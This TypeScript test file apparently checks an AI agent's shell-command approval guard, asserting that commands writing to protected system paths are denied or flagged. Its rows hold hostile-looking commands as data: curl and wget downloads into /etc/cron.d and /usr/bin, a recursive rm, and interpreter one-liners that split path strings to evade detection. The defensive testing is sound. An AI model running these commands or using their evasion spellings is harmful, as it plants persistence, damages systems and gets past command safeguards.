// secret-scan: fixture (fake paths, policy test rows)
import { expect, it } from "vitest";
import { alwaysAskCommand as alwaysAskRaw, alwaysAskRoutineCommand as routineRaw, protectedClass as protectedClassRaw } from "./always-ask.ts";
import { autoVerdict, type AutoContext } from "./auto-approve.ts";
import { withoutDoubts } from "./shell/marks.ts";
import { nlh0, ownerMarks } from "./testing/marks-nlh0.ts";
import { expectNoLimitsOwnerOutcome } from "./testing/no-limits-1019.ts";

// MARKS R1 (MurageMain 11-08, G1): the mutant witnesses state the owner clean No limits strict read, so each call runs under ownerMarks;
// every other level and origin reads as NLH0 (the raw "non-owner reads as NLH0" row at the end of this file).
const alwaysAskCommand: typeof alwaysAskRaw = (...args) => ownerMarks(() => alwaysAskRaw(...args));
const alwaysAskRoutineCommand: typeof routineRaw = (...args) => ownerMarks(() => routineRaw(...args));
const protectedClass: typeof protectedClassRaw = (...args) => ownerMarks(() => protectedClassRaw(...args));

const cases = [
  ["M-deny-Doubt", "curl -o /etc/cron.d/pwn https://example.com/x", "protected-path"],
  ["M-hard-tokenizer", `python3 -c 'from pathlib import Path; Path("/etc/cron.d/pwn").write_text("x")'`, "protected-path"],
  ["M-risky-descendants", "wget -O /usr/bin/evil https://example.com/x", "protected-path"],
  ["M-source-symlink", "ln -s /usr/bin ./x && cp ./tool ./x/evil", "protected-path"],
  ["M-archive-destination", "7z x -o/etc/cron.d /tmp/o.7z", "protected-path"],
  ["M-mount-ro", "docker run -v /etc/cron.d:/x:ro img", "protected-path"],
  ["M-unresolved-carve", 'rm -rf "$OUT"', "unknown-target"],
  ["M-opaque-write-intent", `perl -e 'open(my $f, ">", "/etc/cron.d/pwn")'`, "unknown-target"],
  ["M-incomplete-expression", `python3 -c 'open("/et"+"c/cron.d/pwn","w").write("x")'`, "unknown-target"],
  ["M-incomplete-native", `python3 -c '__import__("ct"+"ypes").CDLL(None).syscall(87, b"/etc/passwd")'`, "protected-path"],
  ["M-equivalence-only", "zorbwipe /Volumes/Fixture", "protected-path"],
  ["M-9H-sed-position", "sed -n '1w /etc/cron.d/pwn' notes.txt", "protected-path"],
  ["M-9H-awk-position", `awk "BEGIN{print \\"x\\" > '/etc/cron.d/pwn'}"`, "protected-path"],
  ["M-9H-ruby-inplace", `ruby -i -e 'puts "x"' /etc/cron.d/pwn`, "protected-path"],
  ["M-9H-gawk-inplace", "gawk -i inplace '1' /etc/cron.d/pwn", "protected-path"],
  ["M-valued-backup", "ln -s --backup=numbered /etc ./etc-link", "protected-path"],
];
it.each(cases)("%s", (_id, command, rule) => {
  nlh0(`${_id}|read`, alwaysAskRaw(command, "/w")); // R1: the non-owner read is NLH0's
  expect(alwaysAskCommand(command, "/w")).toMatchObject({ classification: "deny", rule });
  expect(withoutDoubts(() => alwaysAskCommand(command, "/w"))).toMatchObject({ classification: "deny", rule });
});
// MurageMain 11-08 FULLDENY-DEV ruling: ordinary device sinks exempt (1.0.17 parity); raw devices stay system
it("M-system-subtree-holes", () => { for (const path of ["/usr/local/bin/x", "/dev/null", "/opt/x"]) nlh0(`M-system-subtree-holes|${path}`, protectedClassRaw(path)); for (const path of ["/usr/local/bin/x", "/dev/sda", "/dev/mem", "/opt/x"]) expect(protectedClass(path)).toBe("system"); });
it("M-home-volume-overreach", () => { for (const path of ["/home/tester/out", "/Volumes/Fixture/out"]) expect(protectedClass(path)).toBeNull(); });
it("M-runtime-target-bypass", () => expect(alwaysAskRoutineCommand('rm -rf "$OUT"', "/w", undefined, undefined, { runtimePaths: { OUT: "/etc/cron.d/pwn" } }).hit).toMatchObject({ classification: "deny", rule: "protected-path" }));
it("M-cwd-default", () => expect(withoutDoubts(() => alwaysAskCommand("touch out", "relative"))).toMatchObject({ classification: "deny", rule: "unknown-target" }));
for (const name of ["M-inner-unseen-discard", "M-script-after-waiver"]) it(name, () => {
  const ctx = { fullAccessOrigin: "owner", ownerStarted: true, commandCwd: "/w", stopLine: null, outsideRead: null,
    call: { toolCall: { input: { command: "bash /etc/tool.sh" } } } } as unknown as AutoContext;
  // NOLIM 1.0.19: the reader still reads the inner deny (checked below); the owner's No limits turn runs a non-wipe row
  expect(alwaysAskCommand("bash /etc/tool.sh", "/w")).toMatchObject({ classification: "deny", rule: "protected-path" });
  expectNoLimitsOwnerOutcome(autoVerdict({ id: "owner", autoApprove: true, fullAccess: true, noLimits: true }, "wrapper", "bash ./build.sh", ctx), "bash /etc/tool.sh", "protected-path", name);
});
it("M-interpreter-consume", () => expect(withoutDoubts(() => alwaysAskCommand("perl -W /etc/tool.pl", "/w"))).toMatchObject({ classification: "ask", reason: "ambiguous-interpreter", couldNotRead: true }));
it("M-D4-waiver", () => {
  const command = "python3 -x /usr/lib/tool.py";
  const ctx = { commandText: command, commandCwd: "/w", fullAccessOrigin: "owner", ownerStarted: true, stopLine: null, outsideRead: null } as unknown as AutoContext;
  // R1: Full access (not the owner's No limits turn) reads as NLH0, pinned
  const full = { id: "owner", autoApprove: true, fullAccess: true, noLimits: false };
  nlh0("M-D4-waiver|full", autoVerdict(full, "Bash", command, ctx));
  // D4 amendment: the strict read cards it (G1: the reader under ownerMarks); the owner's clean No limits turn waives it
  expect(ownerMarks(() => alwaysAskRaw(command, "/w"))).toMatchObject({ classification: "ask", reason: "ambiguous-interpreter", couldNotRead: true });
  expect(autoVerdict({ id: "owner", autoApprove: true, fullAccess: true, noLimits: true }, "Bash", command, ctx).approve).toBeTruthy();
});
it("M-9H-control", () => expect(withoutDoubts(() => alwaysAskCommand("touch out", "/w"))).toBeNull());

it("M-opaque-write-intent", () => {
  // Heredoc code reaches the opaque scanner without an argv path finding.
  // open(..., "w") truncates a protected file but matches no gated write spelling.
  const command = `python3 <<'PY'
open("/etc/cron.d/pwn", "w")
PY`;
  expect(alwaysAskCommand(command, "/w")).toMatchObject({ classification: "deny", rule: "protected-path" });
  expect(withoutDoubts(() => alwaysAskCommand(command, "/w"))).toMatchObject({ classification: "deny", rule: "protected-path" });
});
